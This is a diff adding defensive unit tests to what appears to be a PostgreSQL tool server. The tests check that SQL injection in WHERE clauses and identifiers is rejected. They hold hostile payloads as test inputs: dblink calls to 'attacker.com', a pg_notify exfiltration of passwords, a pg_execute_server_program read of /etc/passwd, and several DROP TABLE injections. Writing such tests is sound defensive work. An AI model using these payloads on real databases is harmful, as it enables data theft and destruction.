@@ -318,6 +318,99 @@ describe("FTS Config SQL Injection", () => {
 });
 
 // =============================================================================
+// WHERE Clause — Remote Access & Side Channel Injection Tests
+// =============================================================================
+
+describe("WHERE Clause Remote Access & Side Channel Injection", () => {
+  let mockAdapter: ReturnType<typeof createMockPostgresAdapter>;
+  let textTools: ReturnType<typeof getTextTools>;
+  let mockContext: ReturnType<typeof createMockRequestContext>;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    mockAdapter = createMockPostgresAdapter();
+    textTools = getTextTools(mockAdapter as unknown as PostgresAdapter);
+    mockContext = createMockRequestContext();
+  });
+
+  it("should reject WHERE clause with dblink_connect", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "1=1 OR dblink_connect('host=attacker.com')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with dblink_exec", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "1=1 OR dblink_exec('conn', 'SELECT * FROM secrets')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with pg_notify", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "pg_notify('exfil_channel', password)",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with dblink()", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where:
+          "id IN (SELECT * FROM dblink('host=attacker.com','SELECT 1') AS t(x int))",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with pg_execute_server_program", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "pg_execute_server_program('/bin/cat /etc/passwd')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+});
+
+// =============================================================================
 // Vector Tools WHERE Injection Tests
 // =============================================================================
 
@@ -405,6 +498,80 @@ describe("Table/Schema Name Injection via Manual Quoting", () => {
 });
 
 // =============================================================================
+// Admin Tool Identifier Injection Tests
+// =============================================================================
+
+describe("Admin Tool Identifier Injection", () => {
+  let mockAdapter: ReturnType<typeof createMockPostgresAdapter>;
+  let mockContext: ReturnType<typeof createMockRequestContext>;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    mockAdapter = createMockPostgresAdapter();
+    mockContext = createMockRequestContext();
+  });
+
+  it("should reject pg_vacuum table names with injection", async () => {
+    const { getAdminTools } = await import("../admin.js");
+    const tools = getAdminTools(mockAdapter as unknown as PostgresAdapter);
+    const tool = tools.find((t) => t.name === "pg_vacuum")!;
+
+    const result = (await tool.handler(
+      { table: 'users"; DROP TABLE users;--' },
+      mockContext,
+    )) as { success: boolean; error: string };
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBeDefined();
+  });
+
+  it("should reject pg_analyze column names with injection", async () => {
+    const { getAdminTools } = await import("../admin.js");
+    const tools = getAdminTools(mockAdapter as unknown as PostgresAdapter);
+    const tool = tools.find((t) => t.name === "pg_analyze")!;
+
+    const result = (await tool.handler(
+      { table: "users", columns: ['email"; DROP TABLE users;--'] },
+      mockContext,
+    )) as { success: boolean; error: string };
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBeDefined();
+  });
+
+  it("should reject pg_reindex names with injection", async () => {
+    const { getAdminTools } = await import("../admin.js");
+    const tools = getAdminTools(mockAdapter as unknown as PostgresAdapter);
+    const tool = tools.find((t) => t.name === "pg_reindex")!;
+
+    const result = (await tool.handler(
+      { target: "table", name: 'users"; DROP TABLE users;--' },
+      mockContext,
+    )) as { success: boolean; error: string };
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBeDefined();
+  });
+
+  it("should reject pg_cluster index names with injection", async () => {
+    const { getAdminTools } = await import("../admin.js");
+    const tools = getAdminTools(mockAdapter as unknown as PostgresAdapter);
+    const tool = tools.find((t) => t.name === "pg_cluster")!;
+
+    const result = (await tool.handler(
+      {
+        table: "users",
+        index: 'idx_users"; DROP TABLE users;--',
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBeDefined();
+  });
+});
+
+// =============================================================================
 // Summary of Security Findings
 // =============================================================================
 
@@ -416,14 +583,12 @@ describe("Table/Schema Name Injection via Manual Quoting", () => {
  * ✅ PROTECTED:
  * - Identifier injection (table names, column names) - sanitizeIdentifier prevents attacks
  * - Data value injection - parameterized queries with $1, $2 placeholders
- *
- * ⚠️ POTENTIAL VULNERABILITIES (tests document current behavior):
- * - WHERE clause parameters are passed directly without validation
- * - FTS config strings are interpolated without validation
- * - DDL expressions (check, default, constraint.expression) may be vulnerable
+ * - WHERE clause injection - sanitizeWhereClause blocks dangerous patterns
+ * - FTS config injection - validated against PostgreSQL identifier pattern
+ * - Admin tool injection - sanitizeIdentifier/sanitizeTableName on all DDL construction
  *
  * RECOMMENDATIONS:
- * 1. Add WHERE clause validation/sanitization
- * 2. Validate FTS config against known PostgreSQL text search configurations
+ * 1. Continue using parameterized queries for all data values
+ * 2. Continue using sanitizeIdentifier/sanitizeTableName for all identifiers
  * 3. Review DDL expression handling in pg_create_table
  */
